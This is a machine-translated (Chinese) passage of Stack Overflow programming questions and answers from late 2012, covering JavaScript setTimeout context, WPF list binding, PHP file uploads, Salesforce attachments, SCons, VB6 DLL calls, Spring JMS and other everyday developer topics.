![在此处输入图像描述](../Images/3b107d88df777b4558d8ef8f8b1904b4.png)

我想要的是：

![在此处输入图像描述](../Images/996ff954397affcd1d9721dab30f5f81.png)

例如：我从下拉列表中选择了一些东西（发件人）。然后在下拉字段下方应显示一个新的标签和不可编辑的文本字段，它从其他组件获取输入。（见截图）。

一个示例或教程链接会很棒！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T07:02:55.233

看看wicket-examples。在我看来，您的案例就像 OnChangeAjaxBehaviorPage 和 ChoicePage 的组合。

# javascript - setTimeout (JavaScript) 的执行上下文

> ID：13870049
> 
> 赞同：1
> 
> 时间：2012-12-13T23:01:01.277
> 
> 标签：javascript, settimeout

1）有人可以说明 setTimeout 在执行线程方面是如何工作的。

考虑：

```
function foo() { alert('foo'); }
function bar() { alert('bar'); }  
setTimeout(foo,1000);
bar(); 
```

或者

```
function foo() { alert('foo'); setTimeout(foo,1000); }
function bar() { alert('bar'); }  
setTimeout(foo,1000);
bar(); 
```

或者

```
function foo() { alert('foo'); setTimeout(foo,1000); }
function bar() { /* an execution that runs with unknown time */ }  
setTimeout(foo,1000);
bar(); 
```

或者

```
function foo() { alert('foo'); setTimeout(foo,1000); }
function bar() { /* some ajax call that reply with unknown time */ }  
setTimeout(foo,1000);
bar(); 
```

或者

```
function foo() { alert('foo'); setTimeout(foo,1000); }
function bar() { alert('foo'); setTimeout(bar,1000); }  
setTimeout(foo,1000);
setTimeout(bar,1000); 
```

2）有人可以解释为什么“这个”对象在 setTimeout 中不起作用以及我们可以做些什么来解决这个问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-13T23:15:20.450

请阅读@DaveAnderson 建议的文章。

至于其他的东西，setTimeout/setInterval 有两种形式：

```
setTimeout(arg, timeout) 
```

如果 arg 是字符串，则将其视为要执行的源代码。这和 eval() 一样糟糕。躲开它。

如果 arg 是一个函数，那么它将在全局上下文中执行：

```
var Test = function () {
    this.x = 1;
    setTimeout(function () {
        console.log('x: ' + this.x);
    }, 10);
};

var t = new Test(); 
```

打印 x：未定义。

所以你想做的是：

```
function foo() { alert('foo'); }
setTimeout('foo()', 1000); 
```

或更好：

```
setTimeout(foo, 1000); 
```

要修复函数的上下文，请使用 bind 方法：

```
var Test = function () {
    this.x = 1;
    var f = function () {
        console.log('x: ' + this.x);
    };
    setTimeout(f.bind(this), 10);         // use this as the context
};

var t = new Test(); 
```

或手动执行：

```
var Test = function () {
    this.x = 1;
    var that = this;
    setTimeout(function () {
        console.log('x: ' + that.x);     // closure: closing over that
    }, 10);
};

var t = new Test(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:14:22.773

据我记得：

```
var me = this;
me.f(); 
```

（这可能会在另一种情况下改变其含义）。

# jquery - 使用 iPad 时专注于页面滚动导航

> ID：13870068
> 
> 赞同：0
> 
> 时间：2012-12-13T23:02:10.127
> 
> 标签：jquery, ipad, jquery-plugins, scroll, focus

我使用 Page Scroller Lite [http://pagescroller.com在](http://pagescroller.com)[http://www.thestitchshop.co.uk](http://www.thestitchshop.co.uk)建立了一个单页网站

单击菜单项时，似乎存在一个问题，即 scolling 只能工作一次。只有在通过在页面上滑动手指“手动”滚动页面后，它才会再次起作用。

显然，问题在于内容在滚动并点击导航后获得焦点，然后实际点击它后面。

我曾尝试联系 pagecroller 的作者，但没有成功。

那么，我该如何解决呢？我没有任何 JS 知识，所以在此过程中我需要更多帮助。非常感谢。

顺便说一句，我在这里发布了同样的问题[http://www.sitepoint.com/forums/showthread.php?886838-Problem-with-page-scrolling-on-iPad](http://www.sitepoint.com/forums/showthread.php?886838-Problem-with-page-scrolling-on-iPad)并且我尝试添加建议的代码不知何故，但没有成功。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:31:19.513

首先我想说的是，由于您发布了有关移动设备的问题，因此您应该始终提供您正在运行的操作系统版本。它可以区分工作和不受支持的东西。

话虽如此，我在运行 iOS 6 的 iPhone 和 iPad 上测试了您对该插件的实现，它运行良好。对于像页面滚动这样简单的事情，您实际上并不需要使用插件，因为 jQuery 本身可以开箱即用地完成这项繁重的工作。请参阅这篇文章 -[使用 jquery 滚动到 div](https://stackoverflow.com/questions/3432656/scroll-to-a-div-using-jquery)

# php - 在 .ajax 调用的页面上使用 $_FILES

> ID：13870070
> 
> 赞同：1
> 
> 时间：2012-12-13T23:02:28.817
> 
> 标签：php, ajax, file, session

我有两个正在使用的 .php 页面。Index.php 有一个回传到 index.php 的文件上传表单。提交表单后，我可以在 index.php 上访问 $_FILES 没问题。

我的问题是我希望（在表单提交和页面加载之后）使用 .ajax (jQuery) 调用另一个 .php 文件，以便该文件可以打开并处理一些行并将结果返回给 ajax。ajax 然后显示结果并递归调用自身来处理下一批行。

基本上我想以块的形式处理（放入数据库等）csv并在块之间为用户显示它。我这样做是因为文件有 400,000+ 行，用户不想等待 10+ 分钟来处理它们。

我不想移动这个文件（保存它），因为我只需要处理它并把它扔掉，如果用户在处理文件时关闭页面，它不会被扔掉。我可以 cron 编写脚本，但我不想。

我真正想做的是通过 .ajax 传递（单个）$_FILES 或将其保存在 $_POST 或 $_SESSION 中以在第二页上使用。

我的事业有希望吗？

如果有帮助，继承 ajax 代码：

```
 function processCSV(startIndex, length)
    {
        $.ajax({ 
            url: "ajax-targets/process-csv.php", 
            dataType: "json",
            type: "POST",
            data: { startIndex: startIndex, length: length },
            timeout: 60000, // 1000 = 1 sec
            success: function(data) {
                // JQuery to display the rows from the CSV

                var newStart = startIndex+length;
                if(newStart <= data['csvNumRows']) {
                    processCSV(newStart, length);
                }
            }
        });
    }
    processCSV(1, 2);
}); 
```

PS我确实尝试[过使用PHP将$_FILES或$_POST传递到新页面，](https://stackoverflow.com/questions/8731421/passing-files-or-post-to-a-new-page-with-php)但它对我不起作用:(SOS。

**澄清一下：**我的问题是我想访问由 ajax 调用的页面上的 $_FILE 。该文件上传到 index.php，表单为 action="#"，因此它发布到 index.php。在发布 index.php 向 process-csv.php 发送 ajax 调用后，我需要在 process-csv.php 上可以访问该文件。我不想移动文件，因为我不想清理旧文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:20:14.153

所以我不认为你曾经说过你的问题，但我猜你的问题是你无法 ajax 文件。这样做的原因是因为您实际上无法在 javascript 中获取文件信息，因为它存在安全风险。不过，有很多方法可以做到这一点。您可以使用 flash 或 iframe 来伪造文件上传之类的 ajax。

[jQuery iframe 文件上传](https://stackoverflow.com/questions/7909161/jquery-iframe-file-upload)

我实际上喜欢 Flash 版本，因为它使您能够一次上传多个文件，并且仍然提供 iframe 所做的一切以及更多事件。

[http://code.google.com/p/swfupload/](http://code.google.com/p/swfupload/)

使用uploadComplete，您可以使用然后放置您拥有的处理代码，并使用uploadStart 传递一个标记，表示将此会话与添加到数据库的文件链接起来。

此外，在您的处理过程中，请确保您始终传递您已经走了多远，因此它不会每次都返回相同的行。

我希望这会有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:24:52.607

只需在 JavaScript 中构造数据行，然后：

```
data: { 
    startIndex: startIndex, 
    length: length, 
    rows: variableWithRows.slice(startIndex, startIndex + length)
}, 
```

在 PHP 中，所有行都将`$_POST['rows']`作为数组数据。

# c# - 列表 发生更改时不更新 UI

> ID：13870073
> 
> 赞同：1
> 
> 时间：2012-12-13T23:02:47.193
> 
> 标签：c#, wpf, xaml, binding

```
<ListBox x:Name="MainList" HorizontalAlignment="Left" Height="468" Margin="10,10,0,0" VerticalAlignment="Top" Width="100" ItemsSource="{Binding Items,Mode=TwoWay}" DisplayMemberPath="Name"/>

[Serializable()]
public class MYcontainer : INotifyPropertyChanged,ISerializable
{
    private List<MYClass> _items = new List<MYClass>();
    public List<MYClass> Items
    {
        get{ return _items;}
       set { this._items =value;
        OnPropertyChanged("Items");
    }
public event PropertyChangedEventHandler PropertyChanged;
    public void OnPropertyChanged(string propertyName = null)
    {
        var eventHandler = this.PropertyChanged;
        if (eventHandler != null)
            eventHandler(this, new PropertyChangedEventArgs(propertyName));
    }  
} 
```

当我将一个项目添加到“项目”时，UI 不会更新，绑定工作正常，因为如果我关闭窗口并再次打开它，新项目会正确显示。

我究竟做错了什么？我知道如果我使用`ObservableCollection`它会正常工作，但它不应该使用`List<>`吗？我已经在另一个窗口中有一个 string[] 属性，它更新得很好。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-13T23:23:18.100

如果您不想使用，`ObservableCollection`则必须实施`INotifyCollectionChanged`.

```
public partial class MainWindow : Window, INotifyCollectionChanged
{

    public event NotifyCollectionChangedEventHandler CollectionChanged;

    public MainWindow()
    {
        InitializeComponent();
    }

    public void NotifyCollectionChanged(NotifyCollectionChangedAction action)
    {
        if (CollectionChanged != null)
        {
            CollectionChanged(this, new NotifyCollectionChangedEventArgs(action));
        }
    }
} 
```

但是`ObservableCollection`，这一切都为您服务，向您添加所有相同的逻辑`List<T>`只会创建一个自定义`ObservableCollection`，当 MS 已经为您做了这个时，我认为这没有任何意义

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-13T23:06:57.293

目前只有当您将整个列表替换为新的`List<MyClass>`. 替换 1 项不会触发`OnPropertyChanged`事件。

使用 a`ObservableCollection<MyClass>`而不是 a `List<MyClass>`。它专为处理此问题而构建，并在集合中的项目发生更改时通知 WPF。

它在其他方面与 list 非常相似，因此对代码的更改应该是最小的（List 和 ObservableCollection 都实现了`ICollection<T>`接口，因此大多数方法都是共享的）。

# ruby-on-rails - 共享服务器 Dreamhost

> ID：13870074
> 
> 赞同：0
> 
> 时间：2012-12-13T23:02:48.723
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, dreamhost

我正在尝试在共享服务器上安装应用程序。如果我理解正确，因为我使用的是共享服务器，并且 Dreamhost 不认为 rails 3.2.8 我必须使用 FCGI，尽管我不确定如何安装并使其正常运行。

从本教程[http://wiki.dreamhost.com/Rails_3](http://wiki.dreamhost.com/Rails_3)。

据我了解，我做了什么，

1.  在 dreamhost 中，激活 PHP 5.xx FastCGI 并确保未选中 Phusion Passenger
2.  在我的本地机器上创建一个应用程序
3.  因为 rails 没有创建调度和访问文件，所以我在 /public 文件夹中创建了以下两个文件

dispatch.fcgi #!/home/username/.rvm/rubies/ruby-1.9.3-p327/bin/ruby

```
ENV['RAILS_ENV'] ||= 'production'
ENV['HOME'] ||= `echo ~`.strip
ENV['GEM_HOME'] = File.expand_path('~/.rvm/gems/ruby 1.9.3-p327')
ENV['GEM_PATH'] = File.expand_path('~/.rvm/gems/ruby 1.9.3-p327') + ":" +
    File.expand_path('~/.rvm/gems/ruby 1.9.3-p327@global')

require 'fcgi' 
require File.join(File.dirname(__FILE__), '../config/environment')

class Rack::PathInfoRewriter
 def initialize(app)
   @app = app
 end

 def call(env)
   env.delete('SCRIPT_NAME')
   parts = env['REQUEST_URI'].split('?')
   env['PATH_INFO'] = parts[0]
   env['QUERY_STRING'] = parts[1].to_s
   @app.call(env)
 end
end 
```

然后创建文件 .htaccess

```
<IfModule mod_fastcgi.c>
AddHandler fastcgi-script .fcgi
</IfModule>
<IfModule mod_fcgid.c>
AddHandler fcgid-script .fcgi
</IfModule>

Options +FollowSymLinks +ExecCGI 

RewriteEngine On 

RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ dispatch.fcgi/$1 [QSA,L] 

ErrorDocument 500 "Rails application failed to start properly" 
```

1.  上传到一个文件夹并指向dreamhost中的公用文件夹
2.  确保 dispatch.fcgi 有 777 用于写入
3.  ssh 并在公用文件夹中运行以下命令： .`/dispatch.fcgi`
4.  交叉我的手指但它不起作用我收到以下错误

    ./dispatch.fcgi：第 1 行：ENV[RAILS_ENV]：找不到命令 ./dispatch.fcgi：第 1 行：=：找不到命令 ./dispatch.fcgi：第 2 行：ENV[HOME]：找不到命令 ./ dispatch.fcgi：第 2 行：=：找不到命令 ./dispatch.fcgi：第 3 行：意外标记附近的语法错误`(' ./dispatch.fcgi: line 3:`ENV['GEM_HOME'] = File.expand_path('~/.rvm/gems/ruby 1.9.3- p327')'

做错了吗？？？哦，如果我在服务器上，我会得到这个`Rails application failed to start properly`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T23:01:28.367

我在一条类似的船上。确保在第一行设置您的用户名。rvm 版本也缺少 dispatch.fcgi 的最后一行。从另一个调度示例中获取最后一行并设置您的应用程序名称。

最后确保您的环境和数据库文件设置正确，并且您拥有所需的 gem，例如 mysql2、fcgi 和 therubyracer。

我还没有解决我的问题，但是一旦我弄清楚需要什么，我会写一篇博客文章。

# objective-c - UIViews 太多会导致延迟

> ID：13870077
> 
> 赞同：1
> 
> 时间：2012-12-13T23:02:59.223
> 
> 标签：objective-c, ios, uiview, drawing, lag

我正在创建一个用于练习的应用程序，它是一个简单的绘图应用程序。用户沿着屏幕拖动他/她的手指，它会在 100 像素 x 100 像素的正方形中着色。

我目前通过在用户点击的地方创建一个新的彩色 UIView 来实现这一点，这是有效的。但是，经过一段时间的着色，会有很大的延迟，我认为这是因为作为主视图的子视图的 UIView 太多。

无论有多少 UIView，我和其他类似地在拖动手指时创建 UIView 的人如何将延迟减少到完全没有。我也认为这可能是一项不可能完成的任务，那么像我这样的人怎么能在主视图中用手指沿屏幕拖动时为上述大小的立方体着色呢？

我知道这似乎是一个特定的问题，但我相信它可以帮助其他人了解如何减少延迟，如果有大量 UIViews 可用的性能降低选项较少。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:16:29.513

一种方法是将每个正方形绘制成图像并显示该图像，而不是为每个正方形保留一个 UIView。

但是，如果您的绘图足够简单，您可以使用 OpenGL 来执行此操作，这要快得多。您应该查看 Apple 的[GL Paint Sample Code](http://developer.apple.com/library/ios/#samplecode/GLPaint/Introduction/Intro.html)，它展示了如何在 OpenGL 中执行此操作。

如果您的绘图对于 OpenGL 来说过于复杂，您可以创建例如 CGBitmapContext，并在用户拖动手指时将每个正方形绘制到该上下文中。每当您在该位图中绘制一个新正方形时，您都可以将位图转换为图像（通过 CGBitmapConxtextCreateImage）并将该图像显示为 UIImageView。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T01:52:38.357

我想到了两件事：

1- 使用 Instruments 工具检查您是否泄漏了任何内存

2-如果您只是为视图着色而不是为每个视图创建图像，请设置 UIView 的背景颜色属性或覆盖 drawRect 方法以进行自定义绘图

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-13T23:10:37.847

我认为您正在寻找的是 UIView 的 drawRect: 方法。您可以创建您的自定义 UIView（您可能已经拥有它）并覆盖 drawRect 方法并在那里进行绘图！您必须将绘图保存在数组或另一个容器中，并在数组内容更改时调用 setNeedsDisplay 方法。

# salesforce - 如何在asp.net网站上显示salesforce附件以供下载

> ID：13870089
> 
> 赞同：0
> 
> 时间：2012-12-13T23:03:43.260
> 
> 标签：salesforce

我们正在创建使用 salesfoce webservice api 并提取所有信息的 asp.net 网站。我们在网站中有一个功能，可以显示可以下载的联系人“注释和附件”。我一直在谷歌上搜索它，但没有用。

任何人都可以指导我吗？

谢谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T07:04:39.467

您必须直接查询`Attachment`表：

```
SELECT Id, Name, Body, BodyLength, ContentType, CreatedBy.Name, CreatedDate, Description, Owner.Name, ParentId
FROM Attachment 
LIMIT 10 
```

或间接使用子查询：

```
SELECT Id, Name, Email, (SELECT Name FROM Attachments ORDER BY CreatedDate DESC)
FROM Contact
LIMIT 10 
```

文件的实际内容存储在`Body`base64 编码的列中。您必须对其进行解码并（基于内容类型？）另存为文本/二进制文件，使用正确的内容标头将服务器发送给用户...

包含该`Body`列会稍微减慢速度 - 我建议您最初在 ASP 应用程序的“查看附件相关列表”部分中跳过它，并仅在用户真正需要时检索它们（例如通过 Id）...我注意到您可以（最初）只返回 1 行并进行`Body`查询，因此如果您真的想一次性完成所有操作 - 请查看[`queryMore()`](http://www.salesforce.com/us/developer/docs/api/index_Left.htm#StartTopic=Content/sforce_api_calls_querymore.htm)函数文档并确保您的应用程序已处理整个查询定位器（“[光标](http://en.wikipedia.org/wiki/Cursor_%28databases%29)“如果你熟悉这个词）。

因此，只要您可以发送查询（您没有指定使用哪个...“webservice api”听起来您仅限于使用少数选定的 Apex 类公开），上述内容应该在 SOAP API 和 REST API 中都有效作为网络服务）。此外 REST API 有特殊的[`retrieve()`](http://www.salesforce.com/us/developer/docs/api_rest/index_Left.htm#StartTopic=Content/dome_sobject_blob_retrieve.htm)命令。

# string - 如何使用 javascript/php 通过查询字符串安全地传递电子邮件地址？

> ID：13870091
> 
> 赞同：1
> 
> 时间：2012-12-13T23:03:49.957
> 
> 标签：string, email

我有一个表单，其数据将通过 action 参数提交到 salesforce.com 数据库

```
<form name="ifsLeadsForm" id="ifsLeads" action="https://www.salesforce.com/servlet/servlet.WebToLead?encoding=UTF-8" method="post"> 
```

Salesforce 允许在数据提交到数据库后发送用户的返回 URL。

```
<input type="hidden" name="retURL" value="myReturnURL" /> 
```

我需要将表单中的“firstName”输入和“email”输入的值传递给返回 URL（一个 php 文档），这样我就可以 $_GET 名称和电子邮件地址，并且可以将电子邮件发送给用户感谢他们提交信息。

我使用 .serialize() 函数来获取 firstName 和 email 输入的键/值，并将它们附加到返回 URL：

```
<script type="text/javascript">

    $('#submit').click(function(ev){
    var queryString = $('#first_name, #email').serialize();

    document.ifsLeadsForm.retURL.value = "http://www.myDomain.com/return.php?"+queryString;
    });

</script> 
```

我的问题是——

通过这样的查询字符串传递电子邮件地址是否安全？如果没有，安全的方法是什么？

我很感激任何帮助。

迈克尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T15:58:23.647

使用 GET 请求数据对 URL 中的每个人都是可见的。POST 请求比 GET 安全一点，因为参数不存储在浏览器历史记录或 Web 服务器日志中。

您必须发出 ajax 请求并使用 $_POST 在服务器端获取它。

更多信息[请访问 http://www.w3schools.com/tags/ref_httpmethods.asp](http://www.w3schools.com/tags/ref_httpmethods.asp)

# scons - SCons 目标的构建时确定

> ID：13870092
> 
> 赞同：1
> 
> 时间：2012-12-13T23:03:58.113
> 
> 标签：scons

我有一些需要构建的目标，以确定我的其他一些目标是什么。我如何告诉 SCons？

一个例子：

一个脚本，`generate`在一些配置文件上运行。此脚本根据配置文件中的信息生成包含路径和构建标志。为了构建 SCons `Object`，我需要读取生成的文件。

我只是在运行`Execute()`，`generate`但现在要生成很多文件并且需要很长时间，所以我只想在它或配置文件更改时运行它。`Command`一旦完成了它需要做的任何事情，我如何告诉 SCons 在构建时向我询问更多目标？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-16T09:19:18.543

好的，首先进行一些 SCons 澄清。Scons 在构建过程中有两个阶段。首先，在分析阶段，*所有*Scons 脚本都被执行，结果是一个*静态*依赖树，描述了脚本中定义的所有构建器的源文件和目标文件。接下来，基于该树、上次构建的构建数据库和磁盘上文件的签名，所有目标过期的构建器都将被重建。

现在回答你的问题。如果您只想`generate`在必要时运行（当`generate`或配置文件更改时），那么`generate`作为分析阶段的一部分运行是不可能的。所以不要使用`Execute()`. 相反`generate`，必须是自己的建设者。到目前为止，一切都很好。

现在你有两个构建器，第一个构建器`generate`和第二个构建器，我称之为`buildObject`. `buildObject`取决于 的目标`generate`，但正如您所说，`generate`目标在分析时是未知的（因为`generate`未运行，它仅设置为构建器）。在分析时有未知目标是 SCons 的一个典型挑战，并且没有简单的方法来解决它。

我通常使用我所谓的`SCons.pleaser`文件来解决它。在您的情况下，它将是一个`generate`生成包含高分辨率时间戳的已知目标。然后，`buildObject`构建器将此文件作为源。现在，如果你的配置文件没有改变，`generate`就不会运行，SCons.pleaser 也不会改变，`buildObject`也不会运行。如果您更改配置文件，generate 将运行，SCons.pleaser 将更改，并且`buildObject`也会运行。

问候

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T14:31:24.103

我采用的解决方案是创建一个新的 SConstruct，它知道如何进行生成阶段，并且`Execute()`在我到达需要其输出的位之前，它在我的 SConscripts 的早期阶段。它运行良好，因为它只是通过从 SCons 内部调用 SCons 的少量固定开销来构建必要的东西。

# python - 您可以使用 python 连接到 Web 服务，而无需外部模块吗？

> ID：13870093
> 
> 赞同：0
> 
> 时间：2012-12-13T23:03:59.843
> 
> 标签：python, web-services, powershell, soap, module

我使用 PowerShell 使用以下代码连接到 Web 服务：

```
$websvc = New-WebServiceProxy -uri http://myserver:9111/servname?wsdl 
```

然后我可以在变量上运行方法，例如：

```
$websvc.getProp() 
```

我想在 Unix 环境中使用 python 来做到这一点，但我似乎找不到不使用外部模块的方法（例如：SOAPpy、ZSI、SUDS 等）。我无法在 Unix 环境中安装任何 python 模块，所以我想尝试使用标准模块库。有没有办法用 Python 2.6 来做到这一点并且没有外部模块？另外，我假设这是一个 SOAP 服务；但我还没有和开发者讨论过，所以我不能百分百确定。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:18:29.020

*(a) 是的，python 提供了一切可以相当*直接地做到这一点，尽管比你只安装一个库要尴尬得多。

(b) 您无需成为 root 即可安装模块。最方便的方法是使用`virtualenv`and `pip`。

# dll - 试图从 VB 调用 C DLL。无法使参数之一工作

> ID：13870101
> 
> 赞同：1
> 
> 时间：2012-12-13T23:04:23.547
> 
> 标签：dll, vb6

尝试设置 USB 电源板。

这是文档：

```
Initializes the Power USB API.

Name: InitPowerUSB 

Parameters: model:returns the model number(1:basic, 2:digIO, 3:watchdog, 4:Smart), firmware: returns firmware version in ?.? format in a character string (major revision and minor revision) 

Return: >0 if successful. Returns number of PowerUSB devices connected

C++ Example:

if (!m_pwrUSBInit)
{
    int model; char firmware[8];
    if ((ret=InitPowerUSB(&model, firmware)) > 0)
    {
        m_pwrUSBInit = 1;
        m_numDevices = ret;
    }
} 
```

我一直在尝试使用我的 VB6 代码进行大约一个小时的工作，但没有运气。该程序要么崩溃，要么显示错误，例如`Bad Calling Dll Convention`，`type mismatch`等等。

这是我所拥有的：

`Public Declare Function InitPowerUSB Lib "PwrUSBDll.dll" (ByRef model As Integer, ByVal firmware As String) As Integer`

```
Dim model As Integer
model = 0

Dim firmware As String
firmware = ""

If (InitPowerUSB(model, firmware)) > 0) Then

EndIf 
```

我尝试将固件更改为字节数组、byref、字符串、整数、长整数等。它似乎不想运行。

有谁知道这个问题的解决方案？谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-14T04:09:26.830

我无法回答您其余的函数签名问题，因为我没有您的`PwrUSBDll.dll`.

然而，“Bad DLL calling convention”错误通常意味着您有一个`CDecl`入口点，而 VB6 只能在一些帮助下调用这些入口点。

有几个修复。

显而易见的一个是修改源代码并使用重新编译该 DLL `StdCall`。

另一种方法是为该 DLL 创建一个类型库，这有助于将问题告知 VB6 并解决它。

然后您可以选择使用 VB6 的未记录 CDecl 装饰器：

```
Public Declare Function InitPowerUSB CDecl Lib "PwrUSBDll.dll" ( _
    ByRef model As Integer, _
    ByVal firmware As String) As Integer 
```

然而，缺点是这在 IDE 中运行时不起作用，编译为 p-code 时也不起作用。p 代码解释器不处理这个关键字。

因此，您可以在 IDE 运行中绕过它并提供虚拟结果进行测试，*或者*您可以在 VB6 中创建一个小型包装 DLL，将其单独编译为本机代码。

**注意事项：**

为此，为了解决您的问题，我们必须假设您在该参数列表中传递了正确的数据类型。C++`int`是 VB6 `Long`。除非这是一个 Unicode DLL 入口点，否则你最好传递一个 VB6`Byte`数组。函数返回值也最有可能。`ByRef``char[8]``Long`

# php - Xpath 表内表

> ID：13870103
> 
> 赞同：0
> 
> 时间：2012-12-13T23:04:29.163
> 
> 标签：php, xpath, web-scraping, domdocument, domxpath

我在用 DOMXpath 抓取一个表格重的页面时遇到了一些问题。

布局真的很丑，这意味着我试图从表格中的表格中获取内容。使用 Firebug FirePath 我为表格元素获取以下路径：

```
 html/body/table/tbody/tr[3]/td/table[1]/tbody/tr[2]/td[1]/table[1]/tbody/tr[3]/td[4] 
```

现在，经过无休止的实验，我发现，对于独立的桌子，我需要删除“tbody”标签才能使其工作。但这对于表中的表来说似乎还不够。所以我的问题是如何最好地从表中表中的表中获取内容？

我上传了我想在这里抓取的文件：[1](http://www.pjh.org/se/XpathProblemFile.zip)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T02:37:51.690

我遇到了和你一样的问题，我想在另一个表中获取一个表中的值。

我采用了这样的方法来关注我想要获得的部分功能：

```
function parse_html() {//gets a specific part of the table i chose to extract the contents
    $query = $xpath->query('//tr[@data-eventid]/@data-eventid'); //gets the table i want
    $this->parse_table();
}
function parse_table() {//
    $query = $xpath->query('//tr[@data-eventid="405412"]/td[@class="impact"]/span[@title]/@title');...etc//extracts the content of the table
    $this->parseEvaluate();
} 
function parseEvaluate(){
    ...verifying values if correct
} 
```

只是给出想法..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T02:17:51.530

怎么样：

```
//*[contains(text(),"GRABME")] 
```

我知道这可能不是你想要的，但你明白了。识别一个模式并使用该模式来构建 xpath。

# jms - 在 Spring JMS 侦听器池中防止饥饿和确保最小吞吐量的最佳方法

> ID：13870109
> 
> 赞同：0
> 
> 时间：2012-12-13T23:04:49.627
> 
> 标签：jms, activemq, spring-jms

我有一个 JMS 侦听器池：

```
<jms:listener-container connection-factory="jmsConnectionFactory" 
 acknowledge="client" concurrency="10">
    <jms:listener destination="foo1" ref="ref1"/>
    <jms:listener destination="foo2" ref="ref2"/>
    <jms:listener destination="foo3" ref="ref3"/>
    <jms:listener destination="foo4" ref="ref4"/>  // etc...
</jms:listener-container> 
```

我正在寻找一种方法来确保我的某些消息类型不会饿死或阻止所有其他消息类型。示例：我希望我的池中至少有 M% 但不超过 N% 专用于处理 foo1 消息，即使这样的处理可能会不规律地停止。

目前，如果我让这种情况发生，那么我池中的所有 10 个线程最终都将专用于 foo1 消息。foo{2-4} 消息将不得不等待。我可以通过在我的 foo1 监听器上强制超时来防止这种饥饿，但是我没有达到我的吞吐量目标。

有没有一些简单的基于配置的方法来实现这一点？我可以同时运行两个 JMS 侦听器池吗？

或者我最安全的选择是设置两个完全不同的服务器队列，一个专用于 foo1 消息，另一个专用于 foo2-4？

理想情况下，我想做类似以下的事情。但是“并发”不是 jms:listener 的属性，只是 jms:listener-container：

```
<jms:listener-container connection-factory="jmsConnectionFactory" 
 acknowledge="client" concurrency="25">
    <jms:listener destination="foo1" ref="ref1" concurrency="10" /> // ensure higher throughput
    <jms:listener destination="foo2" ref="ref2" concurrency="5" />  // don't let foo1 starve me...
    <jms:listener destination="foo3" ref="ref3" concurrency="5" />  // don't let foo1 starve me...
    <jms:listener destination="foo4" ref="ref4" concurrency="5" />  // etc...
</jms:listener-container> 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T02:16:10.490

理解命名空间配置只是为了简化配置。每个`<listener/>`元素都有**自己的**侦听器容器并从元素“继承”属性`<listener-container/>`。

因此，在您的第一个示例中， concurrency="10"**并未**在所有侦听器之间共享；每个都`<listener/>`获得 10 的并发性。

您可以通过声明两个元素来实现第二个示例`<listener-container/>`，一个具有并发 10，另一个具有 5。然后在适当的容器元素中声明每个侦听器。

希望有帮助。

# java - EJBQL 命名查询 - 如何对 BigDecimal 求和

> ID：13870110
> 
> 赞同：1
> 
> 时间：2012-12-13T23:04:51.067
> 
> 标签：java, ejb, sum, bigdecimal, named-query

我有一个代表钱的 BigDecimal。我希望能够在 NamedQuery 中选择它的总和，但它不会对 BigDecimals 求和。

```
@NamedQuery(name=Account.CALCULATE_TRANSACTIONS, query="SELECT SUM(a.credit) + SUM(a.debit) FROM Transaction a WHERE a.account.id = :accountId AND a.journalEntry.staged = false") 
```

其中贷方和借方是 BigDecimals。这行不通。除了将它们全部拉出，迭代它们并生成总数之外，最好的方法是什么。我知道我可以做到这一点，但如果可能的话，我会在一个查询中寻找一种方法。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T18:44:30.077

只是一个更新/答案。从我研究的所有内容来看，这在 EJBQL3 中是不可能的。我不得不在命名查询的范围之外做这件事。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-10-30T22:27:04.923

这篇文章可能很旧，但它可能对其他人有所帮助。

所以我在这里报告了同样的问题，我意识到你只能`SUM`在数字原始类型上使用。例如`short`、`int`、和。`long`_`float``double`

该`SUM`函数无法处理`null`值

# java - 将 BST 转换为数组

> ID：13870118
> 
> 赞同：3
> 
> 时间：2012-12-13T23:05:36.303
> 
> 标签：java, arrays, tree

我已经看了一遍，似乎找不到任何帮助。对于一个学校项目，我有一个 BST 树，我必须将树中的所有整数放入一个名为 BSTarray 的整数数组中。
这是我到目前为止所拥有的：

```
public int [] toBSTArray() {
    int size = 20;
    int [] BSTarray = new int [size];
    for(int i = 0; i <size; i++) {
        makeArray(root);
        BSTarray[i] = root.getValue();
}

    return BSTarray;
}

//helper method called by toBSTArray
public void makeArray(BinarySearchTreeNode node) {
    if (node != null) {
        makeArray(node.getLeft());
        makeArray(node.getRight());
        // System.out.print(node.getValue() + " ");
    }
} 
```

我认为这个方法应该遍历树并将它找到的值添加到 BSTarray 中的不同索引中，但它所做的只是将相同的数字添加到数组中的所有索引中。我在递归上做错了吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-13T23:24:27.067

试试这个：

```
Integer[] values = extractValues(n).toArray(new Integer[] {}); 
```

使用该方法定义：

```
private static List<Integer> extractValues(Node n) {
    List<Integer> result = new ArrayList<>();
    if (n.getLeft() != null) {
        result.addAll(extractValues(n.getLeft()));
    }

    if (n.getRight() != null) {
        result.addAll(extractValues(n.getRight()));
    }

    result.add(n.getValue());

